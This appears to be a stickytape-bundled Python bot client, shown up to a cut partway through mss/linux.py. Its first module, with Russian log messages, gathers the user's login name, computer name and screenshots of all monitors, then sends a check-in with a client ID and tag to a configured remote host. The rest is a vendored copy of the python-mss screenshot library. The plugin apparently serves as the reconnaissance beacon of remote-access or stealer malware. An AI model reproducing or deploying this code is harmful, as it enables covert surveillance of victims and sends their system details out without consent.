    __stickytape_write_module('plugins/details.py', b"from asyncio import create_task\r\nfrom config import Config\r\nimport os\r\nfrom os.path import join\r\nimport platform\r\nfrom aiofiles import open\r\nfrom mss.windows import MSS as mss\r\nfrom tools import move\r\n\r\n\r\n\r\nclass Details():\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def take_screenshot(self) -> None:\r\n        with mss() as sct:\r\n            for filename in sct.save():\r\n                await move(filename, join(self.conf.log_path, filename))\r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xba\xd1\x80\xd0\xb8\xd0\xbd\xd1\x88\xd0\xbe\xd1\x82 {filename} \xd1\x81\xd0\xbe\xd1\x85\xd1\x80\xd0\xb0\xd0\xbd\xd0\xb5\xd0\xbd')\r\n \r\n    async def callback(self) -> None:\r\n        bg_task = create_task(self.take_screenshot())\r\n        user = os.getlogin()\r\n        pc = platform.node()\r\n        tag = self.conf.tag\r\n\r\n        data = {\r\n            'client_id': self.conf.client_id,\r\n            'tag': tag,\r\n            'user_name': user,\r\n            'pc_name': pc\r\n        }\r\n        \r\n        url = f'{self.conf.host}/receive_details'\r\n\r\n        resp = await self.conf.session.post(url, json=data)\r\n\r\n        async with open(join(self.conf.log_path, 'details.txt'), 'w', encoding='utf8') as f:\r\n            await f.write(f'user name: {user}\\npc name: {pc}\\ntag: {tag}')\r\n\r\n        await self.conf.logger.log(f'\xd0\x9e\xd1\x82\xd1\x81\xd1\x82\xd1\x83\xd0\xba \xd0\xbe\xd1\x82\xd0\xbf\xd1\x80\xd0\xb0\xd0\xb2\xd0\xbb\xd0\xb5\xd0\xbd')\r\n\r\n        await bg_task")
    __stickytape_write_module('mss/__init__.py', b'"""\nAn ultra fast cross-platform multiple screenshots module in pure python\nusing ctypes.\n\nThis module is maintained by Micka\xc3\xabl Schoentgen <contact@tiger-222.fr>.\n\nYou can always get the latest version of this module at:\n    https://github.com/BoboTiG/python-mss\nIf that URL should fail, try contacting the author.\n"""\n\nfrom .exception import ScreenShotError\nfrom .factory import mss\n\n__version__ = "6.1.0"\n__author__ = "Micka\xc3\xabl \'Tiger-222\' Schoentgen"\n__copyright__ = """\n    Copyright (c) 2013-2020, Micka\xc3\xabl \'Tiger-222\' Schoentgen\n\n    Permission to use, copy, modify, and distribute this software and its\n    documentation for any purpose and without fee or royalty is hereby\n    granted, provided that the above copyright notice appear in all copies\n    and that both that copyright notice and this permission notice appear\n    in supporting documentation or portions thereof, including\n    modifications, that you make.\n"""\n__all__ = ("ScreenShotError", "mss")\n')
    __stickytape_write_module('mss/exception.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nfrom typing import TYPE_CHECKING\n\nif TYPE_CHECKING:\n    from typing import Any, Dict  # noqa\n\n\nclass ScreenShotError(Exception):\n    """ Error handling class. """\n\n    def __init__(self, message, details=None):\n        # type: (str, Dict[str, Any]) -> None\n        super().__init__(message)\n        self.details = details or {}\n')
    __stickytape_write_module('mss/factory.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nimport platform\nfrom typing import TYPE_CHECKING\n\nfrom .exception import ScreenShotError\n\n\nif TYPE_CHECKING:\n    from typing import Any  # noqa\n\n    from .base import MSSBase  # noqa\n\n\ndef mss(**kwargs):\n    # type: (Any) -> MSSBase\n    """ Factory returning a proper MSS class instance.\n\n        It detects the plateform we are running on\n        and choose the most adapted mss_class to take\n        screenshots.\n\n        It then proxies its arguments to the class for\n        instantiation.\n    """\n    # pylint: disable=import-outside-toplevel\n\n    os_ = platform.system().lower()\n\n    if os_ == "darwin":\n        from . import darwin\n\n        return darwin.MSS(**kwargs)\n\n    if os_ == "linux":\n        from . import linux\n\n        return linux.MSS(**kwargs)\n\n    if os_ == "windows":\n        from . import windows\n\n        return windows.MSS(**kwargs)\n\n    raise ScreenShotError("System {!r} not (yet?) implemented.".format(os_))\n')
    __stickytape_write_module('mss/base.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nfrom abc import ABCMeta, abstractmethod\nfrom datetime import datetime\nfrom typing import TYPE_CHECKING\nfrom threading import Lock\n\nfrom .exception import ScreenShotError\nfrom .screenshot import ScreenShot\nfrom .tools import to_png\n\nif TYPE_CHECKING:\n    # pylint: disable=ungrouped-imports\n    from typing import Any, Callable, Iterator, List, Optional, Type  # noqa\n\n    from .models import Monitor, Monitors  # noqa\n\n\nlock = Lock()\n\n\nclass MSSBase(metaclass=ABCMeta):\n    """ This class will be overloaded by a system specific one. """\n\n    __slots__ = {"_monitors", "cls_image", "compression_level"}\n\n    def __init__(self):\n        self.cls_image = ScreenShot  # type: Type[ScreenShot]\n        self.compression_level = 6\n        self._monitors = []  # type: Monitors\n\n    def __enter__(self):\n        # type: () -> MSSBase\n        """ For the cool call `with MSS() as mss:`. """\n\n        return self\n\n    def __exit__(self, *_):\n        """ For the cool call `with MSS() as mss:`. """\n\n        self.close()\n\n    @abstractmethod\n    def _grab_impl(self, monitor):\n        # type: (Monitor) -> ScreenShot\n        """\n        Retrieve all pixels from a monitor. Pixels have to be RGB.\n        That method has to be run using a threading lock.\n        """\n\n    @abstractmethod\n    def _monitors_impl(self):\n        # type: () -> None\n        """\n        Get positions of monitors (has to be run using a threading lock).\n        It must populate self._monitors.\n        """\n\n    def close(self):\n        # type: () -> None\n        """ Clean-up. """\n\n    def grab(self, monitor):\n        # type: (Monitor) -> ScreenShot\n        """\n        Retrieve screen pixels for a given monitor.\n\n        Note: *monitor* can be a tuple like PIL.Image.grab() accepts.\n\n        :param monitor: The coordinates and size of the box to capture.\n                        See :meth:`monitors <monitors>` for object details.\n        :return :class:`ScreenShot <ScreenShot>`.\n        """\n\n        # Convert PIL bbox style\n        if isinstance(monitor, tuple):\n            monitor = {\n                "left": monitor[0],\n                "top": monitor[1],\n                "width": monitor[2] - monitor[0],\n                "height": monitor[3] - monitor[1],\n            }\n\n        with lock:\n            return self._grab_impl(monitor)\n\n    @property\n    def monitors(self):\n        # type: () -> Monitors\n        """\n        Get positions of all monitors.\n        If the monitor has rotation, you have to deal with it\n        inside this method.\n\n        This method has to fill self._monitors with all information\n        and use it as a cache:\n            self._monitors[0] is a dict of all monitors together\n            self._monitors[N] is a dict of the monitor N (with N > 0)\n\n        Each monitor is a dict with:\n        {\n            \'left\':   the x-coordinate of the upper-left corner,\n            \'top\':    the y-coordinate of the upper-left corner,\n            \'width\':  the width,\n            \'height\': the height\n        }\n        """\n\n        if not self._monitors:\n            with lock:\n                self._monitors_impl()\n\n        return self._monitors\n\n    def save(self, mon=0, output="monitor-{mon}.png", callback=None):\n        # type: (int, str, Callable[[str], None]) -> Iterator[str]\n        """\n        Grab a screen shot and save it to a file.\n\n        :param int mon: The monitor to screen shot (default=0).\n                        -1: grab one screen shot of all monitors\n                         0: grab one screen shot by monitor\n                        N: grab the screen shot of the monitor N\n\n        :param str output: The output filename.\n\n            It can take several keywords to customize the filename:\n            - `{mon}`: the monitor number\n            - `{top}`: the screen shot y-coordinate of the upper-left corner\n            - `{left}`: the screen shot x-coordinate of the upper-left corner\n            - `{width}`: the screen shot\'s width\n            - `{height}`: the screen shot\'s height\n            - `{date}`: the current date using the default formatter\n\n            As it is using the `format()` function, you can specify\n            formatting options like `{date:%Y-%m-%s}`.\n\n        :param callable callback: Callback called before saving the\n            screen shot to a file.  Take the `output` argument as parameter.\n\n        :return generator: Created file(s).\n        """\n\n        monitors = self.monitors\n        if not monitors:\n            raise ScreenShotError("No monitor found.")\n\n        if mon == 0:\n            # One screen shot by monitor\n            for idx, monitor in enumerate(monitors[1:], 1):\n                fname = output.format(mon=idx, date=datetime.now(), **monitor)\n                if callable(callback):\n                    callback(fname)\n                sct = self.grab(monitor)\n                to_png(sct.rgb, sct.size, level=self.compression_level, output=fname)\n                yield fname\n        else:\n            # A screen shot of all monitors together or\n            # a screen shot of the monitor N.\n            mon = 0 if mon == -1 else mon\n            try:\n                monitor = monitors[mon]\n            except IndexError:\n                # pylint: disable=raise-missing-from\n                raise ScreenShotError("Monitor {!r} does not exist.".format(mon))\n\n            output = output.format(mon=mon, date=datetime.now(), **monitor)\n            if callable(callback):\n                callback(output)\n            sct = self.grab(monitor)\n            to_png(sct.rgb, sct.size, level=self.compression_level, output=output)\n            yield output\n\n    def shot(self, **kwargs):\n        # type: (Any) -> str\n        """\n        Helper to save the screen shot of the 1st monitor, by default.\n        You can pass the same arguments as for ``save``.\n        """\n\n        kwargs["mon"] = kwargs.get("mon", 1)\n        return next(self.save(**kwargs))\n\n    @staticmethod\n    def _cfactory(attr, func, argtypes, restype, errcheck=None):\n        # type: (Any, str, List[Any], Any, Optional[Callable]) -> None\n        """ Factory to create a ctypes function and automatically manage errors. """\n\n        meth = getattr(attr, func)\n        meth.argtypes = argtypes\n        meth.restype = restype\n        if errcheck:\n            meth.errcheck = errcheck\n')
    __stickytape_write_module('mss/screenshot.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nfrom typing import TYPE_CHECKING\n\nfrom .models import Size, Pos\nfrom .exception import ScreenShotError\n\nif TYPE_CHECKING:\n    from typing import Any, Dict, Iterator, Optional  # noqa\n\n    from .models import Monitor, Pixel, Pixels  # noqa\n\n\nclass ScreenShot:\n    """\n    Screen shot object.\n\n    .. note::\n\n        A better name would have  been *Image*, but to prevent collisions\n        with PIL.Image, it has been decided to use *ScreenShot*.\n    """\n\n    __slots__ = {"__pixels", "__rgb", "pos", "raw", "size"}\n\n    def __init__(self, data, monitor, size=None):\n        # type: (bytearray, Monitor, Optional[Size]) -> None\n\n        self.__pixels = None  # type: Optional[Pixels]\n        self.__rgb = None  # type: Optional[bytes]\n\n        #: Bytearray of the raw BGRA pixels retrieved by ctypes\n        #: OS independent implementations.\n        self.raw = data\n\n        #: NamedTuple of the screen shot coordinates.\n        self.pos = Pos(monitor["left"], monitor["top"])\n\n        if size is not None:\n            #: NamedTuple of the screen shot size.\n            self.size = size\n        else:\n            self.size = Size(monitor["width"], monitor["height"])\n\n    def __repr__(self):\n        return ("<{!s} pos={cls.left},{cls.top} size={cls.width}x{cls.height}>").format(\n            type(self).__name__, cls=self\n        )\n\n    @property\n    def __array_interface__(self):\n        # type: () -> Dict[str, Any]\n        """\n        Numpy array interface support.\n        It uses raw data in BGRA form.\n\n        See https://docs.scipy.org/doc/numpy/reference/arrays.interface.html\n        """\n\n        return {\n            "version": 3,\n            "shape": (self.height, self.width, 4),\n            "typestr": "|u1",\n            "data": self.raw,\n        }\n\n    @classmethod\n    def from_size(cls, data, width, height):\n        # type: (bytearray, int, int) -> ScreenShot\n        """ Instantiate a new class given only screen shot\'s data and size. """\n\n        monitor = {"left": 0, "top": 0, "width": width, "height": height}\n        return cls(data, monitor)\n\n    @property\n    def bgra(self):\n        # type: () -> bytes\n        """ BGRA values from the BGRA raw pixels. """\n        return bytes(self.raw)\n\n    @property\n    def height(self):\n        # type: () -> int\n        """ Convenient accessor to the height size. """\n        return self.size.height\n\n    @property\n    def left(self):\n        # type: () -> int\n        """ Convenient accessor to the left position. """\n        return self.pos.left\n\n    @property\n    def pixels(self):\n        # type: () -> Pixels\n        """\n        :return list: RGB tuples.\n        """\n\n        if not self.__pixels:\n            rgb_tuples = zip(\n                self.raw[2::4], self.raw[1::4], self.raw[0::4]\n            )  # type: Iterator[Pixel]\n            self.__pixels = list(zip(*[iter(rgb_tuples)] * self.width))  # type: ignore\n\n        return self.__pixels\n\n    @property\n    def rgb(self):\n        # type: () -> bytes\n        """\n        Compute RGB values from the BGRA raw pixels.\n\n        :return bytes: RGB pixels.\n        """\n\n        if not self.__rgb:\n            rgb = bytearray(self.height * self.width * 3)\n            raw = self.raw\n            rgb[0::3] = raw[2::4]\n            rgb[1::3] = raw[1::4]\n            rgb[2::3] = raw[0::4]\n            self.__rgb = bytes(rgb)\n\n        return self.__rgb\n\n    @property\n    def top(self):\n        # type: () -> int\n        """ Convenient accessor to the top position. """\n        return self.pos.top\n\n    @property\n    def width(self):\n        # type: () -> int\n        """ Convenient accessor to the width size. """\n        return self.size.width\n\n    def pixel(self, coord_x, coord_y):\n        # type: (int, int) -> Pixel\n        """\n        Returns the pixel value at a given position.\n\n        :param int coord_x: The x coordinate.\n        :param int coord_y: The y coordinate.\n        :return tuple: The pixel value as (R, G, B).\n        """\n\n        try:\n            return self.pixels[coord_y][coord_x]  # type: ignore\n        except IndexError:\n            # pylint: disable=raise-missing-from\n            raise ScreenShotError(\n                "Pixel location ({}, {}) is out of range.".format(coord_x, coord_y)\n            )\n')
    __stickytape_write_module('mss/models.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nimport collections\nfrom typing import Dict, List, Tuple\n\n\nMonitor = Dict[str, int]\nMonitors = List[Monitor]\n\nPixel = Tuple[int, int, int]\nPixels = List[Pixel]\n\nPos = collections.namedtuple("Pos", "left, top")\nSize = collections.namedtuple("Size", "width, height")\n')
    __stickytape_write_module('mss/tools.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nimport os\nimport struct\nimport zlib\nfrom typing import TYPE_CHECKING\n\nif TYPE_CHECKING:\n    from typing import Optional, Tuple  # noqa\n\n\ndef to_png(data, size, level=6, output=None):\n    # type: (bytes, Tuple[int, int], int, Optional[str]) -> Optional[bytes]\n    """\n    Dump data to a PNG file.  If `output` is `None`, create no file but return\n    the whole PNG data.\n\n    :param bytes data: RGBRGB...RGB data.\n    :param tuple size: The (width, height) pair.\n    :param int level: PNG compression level.\n    :param str output: Output file name.\n    """\n    # pylint: disable=too-many-locals\n\n    pack = struct.pack\n    crc32 = zlib.crc32\n\n    width, height = size\n    line = width * 3\n    png_filter = pack(">B", 0)\n    scanlines = b"".join(\n        [png_filter + data[y * line : y * line + line] for y in range(height)]\n    )\n\n    magic = pack(">8B", 137, 80, 78, 71, 13, 10, 26, 10)\n\n    # Header: size, marker, data, CRC32\n    ihdr = [b"", b"IHDR", b"", b""]\n    ihdr[2] = pack(">2I5B", width, height, 8, 2, 0, 0, 0)\n    ihdr[3] = pack(">I", crc32(b"".join(ihdr[1:3])) & 0xFFFFFFFF)\n    ihdr[0] = pack(">I", len(ihdr[2]))\n\n    # Data: size, marker, data, CRC32\n    idat = [b"", b"IDAT", zlib.compress(scanlines, level), b""]\n    idat[3] = pack(">I", crc32(b"".join(idat[1:3])) & 0xFFFFFFFF)\n    idat[0] = pack(">I", len(idat[2]))\n\n    # Footer: size, marker, None, CRC32\n    iend = [b"", b"IEND", b"", b""]\n    iend[3] = pack(">I", crc32(iend[1]) & 0xFFFFFFFF)\n    iend[0] = pack(">I", len(iend[2]))\n\n    if not output:\n        # Returns raw bytes of the whole PNG data\n        return magic + b"".join(ihdr + idat + iend)\n\n    with open(output, "wb") as fileh:\n        fileh.write(magic)\n        fileh.write(b"".join(ihdr))\n        fileh.write(b"".join(idat))\n        fileh.write(b"".join(iend))\n\n        # Force write of file to disk\n        fileh.flush()\n        os.fsync(fileh.fileno())\n\n    return None\n')
    __stickytape_write_module('mss/darwin.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nimport ctypes\nimport ctypes.util\nimport sys\nfrom ctypes import (\n    POINTER,\n    Structure,\n    c_double,\n    c_float,\n    c_int32,\n    c_uint64,\n    c_ubyte,\n    c_uint32,\n    c_void_p,\n)\nfrom platform import mac_ver\nfrom typing import TYPE_CHECKING\n\nfrom .base import MSSBase\nfrom .exception import ScreenShotError\nfrom .screenshot import Size\n\nif TYPE_CHECKING:\n    from typing import Any, List, Type, Union  # noqa\n\n    from .models import Monitor, Monitors  # noqa\n    from .screenshot import ScreenShot  # noqa\n\n__all__ = ("MSS",)\n\n\ndef cgfloat():\n    # type: () -> Union[Type[c_double], Type[c_float]]\n    """ Get the appropriate value for a float. """\n\n    return c_double if sys.maxsize > 2 ** 32 else c_float\n\n\nclass CGPoint(Structure):\n    """ Structure that contains coordinates of a rectangle. """\n\n    _fields_ = [("x", cgfloat()), ("y", cgfloat())]\n\n    def __repr__(self):\n        return "{}(left={} top={})".format(type(self).__name__, self.x, self.y)\n\n\nclass CGSize(Structure):\n    """ Structure that contains dimensions of an rectangle. """\n\n    _fields_ = [("width", cgfloat()), ("height", cgfloat())]\n\n    def __repr__(self):\n        return "{}(width={} height={})".format(\n            type(self).__name__, self.width, self.height\n        )\n\n\nclass CGRect(Structure):\n    """ Structure that contains information about a rectangle. """\n\n    _fields_ = [("origin", CGPoint), ("size", CGSize)]\n\n    def __repr__(self):\n        return "{}<{} {}>".format(type(self).__name__, self.origin, self.size)\n\n\n# C functions that will be initialised later.\n#\n# This is a dict:\n#    cfunction: (attr, argtypes, restype)\n#\n# Available attr: core.\n#\n# Note: keep it sorted by cfunction.\nCFUNCTIONS = {\n    "CGDataProviderCopyData": ("core", [c_void_p], c_void_p),\n    "CGDisplayBounds": ("core", [c_uint32], CGRect),\n    "CGDisplayRotation": ("core", [c_uint32], c_float),\n    "CFDataGetBytePtr": ("core", [c_void_p], c_void_p),\n    "CFDataGetLength": ("core", [c_void_p], c_uint64),\n    "CFRelease": ("core", [c_void_p], c_void_p),\n    "CGDataProviderRelease": ("core", [c_void_p], c_void_p),\n    "CGGetActiveDisplayList": (\n        "core",\n        [c_uint32, POINTER(c_uint32), POINTER(c_uint32)],\n        c_int32,\n    ),\n    "CGImageGetBitsPerPixel": ("core", [c_void_p], int),\n    "CGImageGetBytesPerRow": ("core", [c_void_p], int),\n    "CGImageGetDataProvider": ("core", [c_void_p], c_void_p),\n    "CGImageGetHeight": ("core", [c_void_p], int),\n    "CGImageGetWidth": ("core", [c_void_p], int),\n    "CGRectStandardize": ("core", [CGRect], CGRect),\n    "CGRectUnion": ("core", [CGRect, CGRect], CGRect),\n    "CGWindowListCreateImage": (\n        "core",\n        [CGRect, c_uint32, c_uint32, c_uint32],\n        c_void_p,\n    ),\n}\n\n\nclass MSS(MSSBase):\n    """\n    Multiple ScreenShots implementation for macOS.\n    It uses intensively the CoreGraphics library.\n    """\n\n    __slots__ = {"core", "max_displays"}\n\n    def __init__(self, **_):\n        """ macOS initialisations. """\n\n        super().__init__()\n\n        self.max_displays = 32\n\n        self._init_library()\n        self._set_cfunctions()\n\n    def _init_library(self):\n        """ Load the CoreGraphics library. """\n        version = float(".".join(mac_ver()[0].split(".")[:2]))\n        if version < 10.16:\n            coregraphics = ctypes.util.find_library("CoreGraphics")\n        else:\n            # macOS Big Sur and newer\n            # pylint: disable=line-too-long\n            coregraphics = "/System/Library/Frameworks/CoreGraphics.framework/Versions/Current/CoreGraphics"\n\n        if not coregraphics:\n            raise ScreenShotError("No CoreGraphics library found.")\n        self.core = ctypes.cdll.LoadLibrary(coregraphics)\n\n    def _set_cfunctions(self):\n        # type: () -> None\n        """ Set all ctypes functions and attach them to attributes. """\n\n        cfactory = self._cfactory\n        attrs = {"core": self.core}\n        for func, (attr, argtypes, restype) in CFUNCTIONS.items():\n            cfactory(\n                attr=attrs[attr],\n                func=func,\n                argtypes=argtypes,  # type: ignore\n                restype=restype,\n            )\n\n    def _monitors_impl(self):\n        # type: () -> None\n        """ Get positions of monitors. It will populate self._monitors. """\n\n        int_ = int\n        core = self.core\n\n        # All monitors\n        # We need to update the value with every single monitor found\n        # using CGRectUnion.  Else we will end with infinite values.\n        all_monitors = CGRect()\n        self._monitors.append({})\n\n        # Each monitors\n        display_count = c_uint32(0)\n        active_displays = (c_uint32 * self.max_displays)()\n        core.CGGetActiveDisplayList(\n            self.max_displays, active_displays, ctypes.byref(display_count)\n        )\n        rotations = {0.0: "normal", 90.0: "right", -90.0: "left"}\n        for idx in range(display_count.value):\n            display = active_displays[idx]\n            rect = core.CGDisplayBounds(display)\n            rect = core.CGRectStandardize(rect)\n            width, height = rect.size.width, rect.size.height\n            rot = core.CGDisplayRotation(display)\n            if rotations[rot] in ["left", "right"]:\n                width, height = height, width\n            self._monitors.append(\n                {\n                    "left": int_(rect.origin.x),\n                    "top": int_(rect.origin.y),\n                    "width": int_(width),\n                    "height": int_(height),\n                }\n            )\n\n            # Update AiO monitor\'s values\n            all_monitors = core.CGRectUnion(all_monitors, rect)\n\n        # Set the AiO monitor\'s values\n        self._monitors[0] = {\n            "left": int_(all_monitors.origin.x),\n            "top": int_(all_monitors.origin.y),\n            "width": int_(all_monitors.size.width),\n            "height": int_(all_monitors.size.height),\n        }\n\n    def _grab_impl(self, monitor):\n        # type: (Monitor) -> ScreenShot\n        """ Retrieve all pixels from a monitor. Pixels have to be RGB. """\n\n        # pylint: disable=too-many-locals\n\n        core = self.core\n        rect = CGRect(\n            (monitor["left"], monitor["top"]), (monitor["width"], monitor["height"])\n        )\n\n        image_ref = core.CGWindowListCreateImage(rect, 1, 0, 0)\n        if not image_ref:\n            raise ScreenShotError("CoreGraphics.CGWindowListCreateImage() failed.")\n\n        width = core.CGImageGetWidth(image_ref)\n        height = core.CGImageGetHeight(image_ref)\n        prov = copy_data = None\n        try:\n            prov = core.CGImageGetDataProvider(image_ref)\n            copy_data = core.CGDataProviderCopyData(prov)\n            data_ref = core.CFDataGetBytePtr(copy_data)\n            buf_len = core.CFDataGetLength(copy_data)\n            raw = ctypes.cast(data_ref, POINTER(c_ubyte * buf_len))\n            data = bytearray(raw.contents)\n\n            # Remove padding per row\n            bytes_per_row = core.CGImageGetBytesPerRow(image_ref)\n            bytes_per_pixel = core.CGImageGetBitsPerPixel(image_ref)\n            bytes_per_pixel = (bytes_per_pixel + 7) // 8\n\n            if bytes_per_pixel * width != bytes_per_row:\n                cropped = bytearray()\n                for row in range(height):\n                    start = row * bytes_per_row\n                    end = start + width * bytes_per_pixel\n                    cropped.extend(data[start:end])\n                data = cropped\n        finally:\n            if prov:\n                core.CGDataProviderRelease(prov)\n            if copy_data:\n                core.CFRelease(copy_data)\n\n        return self.cls_image(data, monitor, size=Size(width, height))\n')
    __stickytape_write_module('mss/linux.py', b'"""\nThis is part of the MSS Python\'s module.\nSource: https://github.com/BoboTiG/python-mss\n"""\n\nimport ctypes\nimport ctypes.util\nimport os\nimport threading\nfrom ctypes import (\n    POINTER,\n    CFUNCTYPE,\n    Structure,\n    c_char_p,\n    c_int,\n    c_int32,\n    c_long,\n    c_ubyte,\n    c_uint,\n    c_uint32,\n    c_ulong,\n    c_ushort,\n    c_void_p,\n)\nfrom types import SimpleNamespace\nfrom typing import TYPE_CHECKING\n\nfrom .base import MSSBase, lock\nfrom .exception import ScreenShotError\n\nif TYPE_CHECKING:\n    from typing import Any, Dict, List, Optional, Tuple, Union  # noqa\n\n    from .models import Monitor, Monitors  # noqa\n    from .screenshot import ScreenShot  # noqa\n\n\n__all__ = ("MSS",)\n\n\nERROR = SimpleNamespace(details=None)\nPLAINMASK = 0x00FFFFFF\nZPIXMAP = 2\n\n\nclass Display(Structure):\n    """\n    Structure that serves as the connection to the X server\n    and that contains all the information about that X server.\n    """\n\n\nclass Event(Structure):\n    """\n    XErrorEvent to debug eventual errors.\n    https://tronche.com/gui/x/xlib/event-handling/protocol-errors/default-handlers.html\n    """\n\n    _fields_ = [\n        ("type", c_int),\n        ("display", POINTER(Display)),\n        ("serial", c_ulong),\n        ("error_code", c_ubyte),\n        ("request_code", c_ubyte),\n        ("minor_code", c_ubyte),\n        ("resourceid", c_void_p),\n    ]\n\n\nclass XWindowAttributes(Structure):\n    """ Attributes for the specified window. """\n\n    _fields_ = [\n        ("x", c_int32),\n        ("y", c_int32),\n        ("width", c_int32),\n        ("height", c_int32),\n        ("border_width", c_int32),\n        ("depth", c_int32),\n        ("visual", c_ulong),\n        ("root", c_ulong),\n        ("class", c_int32),\n        ("bit_gravity", c_int32),\n        ("win_gravity", c_int32),\n        ("backing_store", c_int32),\n        ("backing_planes", c_ulong),\n        ("backing_pixel", c_ulong),\n        ("save_under", c_int32),\n        ("colourmap", c_ulong),\n        ("mapinstalled", c_uint32),\n        ("map_state", c_uint32),\n        ("all_event_masks", c_ulong),\n        ("your_event_mask", c_ulong),\n        ("do_not_propagate_mask", c_ulong),\n        ("override_redirect", c_int32),\n        ("screen", c_ulong),\n    ]\n\n\nclass XImage(Structure):\n    """\n    Description of an image as it exists in the client\'s memory.\n    https://tronche.com/gui/x/xlib/graphics/images.html\n    """\n\n    _fields_ = [\n        ("width", c_int),\n        ("height", c_int),\n        ("xoffset", c_int),\n        ("format", c_int),\n        ("data", c_void_p),\n        ("byte_order", c_int),\n        ("bitmap_unit", c_int),\n        ("bitmap_bit_order", c_int),\n        ("bitmap_pad", c_int),\n        ("depth", c_int),\n        ("bytes_per_line", c_int),\n        ("bits_per_pixel", c_int),\n        ("red_mask", c_ulong),\n        ("green_mask", c_ulong),\n        ("blue_mask", c_ulong),\n    ]\n\n\nclass XRRModeInfo(Structure):\n    """ Voil\xc3\xa0, voil\xc3\xa0. """\n\n\nclass XRRScreenResources(Structure):\n    """\n    Structure that contains arrays of XIDs that point to the\n    available outputs and associated CRTCs.\n    """\n\n    _fields_ = [\n        ("timestamp", c_ulong),\n        ("configTimestamp", c_ulong),\n        ("ncrtc", c_int),\n        ("crtcs", POINTER(c_long)),\n        ("noutput", c_int),\n        ("outputs", POINTER(c_long)),\n        ("nmode", c_int),\n        ("modes", POINTER(XRRModeInfo)),\n    ]\n\n\nclass XRRCrtcInfo(Structure):\n    """ Structure that contains CRTC information. """\n\n    _fields_ = [\n        ("timestamp", c_ulong),\n        ("x", c_int),\n        ("y", c_int),\n        ("width", c_int),\n        ("height", c_int),\n        ("mode", c_long),\n        ("rotation", c_int),\n        ("noutput", c_int),\n        ("outputs", POINTER(c_long)),\n        ("rotations", c_ushort),\n        ("npossible", c_int),\n        ("possible", POINTER(c_long)),\n    ]\n\n\n@CFUNCTYPE(c_int, POINTER(Display), POINTER(Event))\ndef error_handler(_, event):\n    # type: (Any, Any) -> int\n    """ Specifies the program\'s supplied error handler. """\n\n    evt = event.contents\n    ERROR.details = {\n        "type": evt.type,\n        "serial": evt.serial,\n        "error_code": evt.error_code,\n        "request_code": evt.request_code,\n        "minor_code": evt.minor_code,\n    }\n    return 0\n\n\ndef validate(retval, func, args):\n    # type: (int, Any, Tuple[Any, Any]) -> Optional[Tuple[Any, Any]]\n    """ Validate the returned value of a Xlib or XRANDR function. """\n\n    if retval != 0 and not ERROR.details:\n        return args\n\n    err = "{}() failed".format(func.__name__)\n    details = {"retval": retval, "args": args}\n    raise ScreenShotError(err, details=details)\n\n\n# C functions that will be initialised later.\n# See https://tronche.com/gui/x/xlib/function-index.html for details.\n#\n# This is a dict:\n#    cfunction: (attr, argtypes, restype)\n#\n# Available attr: xlib, xrandr.\n#\n# Note: keep it sorted by cfunction.\nCFUNCTIONS = {\n    "XDefaultRootWindow": ("xlib", [POINTER(Display)], POINTER(XWindowAttributes)),\n    "XDestroyImage": ("xlib", [POINTER(XImage)], c_void_p),\n    "XGetErrorText": ("xlib", [POINTER(Display), c_int, c_char_p, c_int], c_void_p),\n    "XGetImage": (\n        "xlib",\n        [\n            POINTER(Display),\n            POINTER(Display),\n            c_int,\n            c_int,\n            c_uint,\n            c_uint,\n            c_ulong,\n            c_int,\n        ],\n        POINTER(XImage),\n    ),\n    "XGetWindowAttributes": (\n        "xlib",\n        [POINTER(Display), POINTER(XWindowAttributes), POINTER(XWindowAttributes)],\n        c_int,\n    ),\n    "XOpenDisplay": ("xlib", [c_char_p], POINTER(Display)),\n    "XQueryExtension": (\n        "xlib",\n        [\n            POINTER(Display),\n            c_char_p,\n            POINTER(c_int),\n            POINTER(c_int),\n            POINTER(c_int),\n        ],\n        c_uint,\n    ),\n    "XRRFreeCrtcInfo": ("xrandr", [POINTER(XRRCrtcInfo)], c_void_p),\n    "XRRFreeScreenResources": ("xrandr", [POINTER(XRRScreenResources)], c_void_p),\n    "XRRGetCrtcInfo": (\n        "xrandr",\n        [POINTER(Display), POINTER(XRRScreenResources), c_long],\n        POINTER(XRRCrtcInfo),\n    ),\n    "XRRGetScreenResources": (\n        "xrandr",\n        [POINTER(Display), POINTER(Display)],\n        POINTER(XRRScreenResources),\n    ),\n    "XRRGetScreenResourcesCurrent": (\n        "xrandr",\n        [POINTER(Display), POINTER(Display)],\n        POINTER(XRRScreenResources),\n    ),\n    "XSetErrorHandler": ("xlib", [c_void_p], c_int),\n}\n\n\nclass MSS(MSSBase):\n    """\n    Multiple ScreenShots implementation for GNU/Linux.\n    It uses intensively the Xlib and its Xrandr extension.\n    """\n\n    __slots__ = {"drawable", "root", "xlib", "xrandr"}\n\n    # A dict to maintain *display* values created by multiple threads.\n    _display_dict = {}  # type: Dict[threading.Thread, int]\n\n    def __init__(self, display=None):\n        # type: (Optional[Union[bytes, str]]) -> None\n        """ GNU/Linux initialisations. """\n\n        super().__init__()\n\n        if not display:\n            try:\n                display = os.environ["DISPLAY"].encode("utf-8")\n            except KeyError:\n                # pylint: disable=raise-missing-from\n                raise ScreenShotError("$DISPLAY not set.")\n\n        if not isinstance(display, bytes):\n            display = display.encode("utf-8")\n\n        if b":" not in display:\n            raise ScreenShotError("Bad display value: {!r}.".format(display))\n\n        x11 = ctypes.util.find_library("X11")\n        if not x11:\n            raise ScreenShotError("No X11 library found.")\n        self.xlib = ctypes.cdll.LoadLibrary(x11)\n\n        # Install the error handler to prevent interpreter crashes:\n        # any error will raise a ScreenShotError exception.\n        self.xlib.XSetErrorHandler(error_handler)\n\n        xrandr = ctypes.util.find_library("Xrandr")\n        if not xrandr:\n            raise ScreenShotError("No Xrandr extension found.")\n        self.xrandr = ctypes.cdll.LoadLibrary(xrandr)\n\n        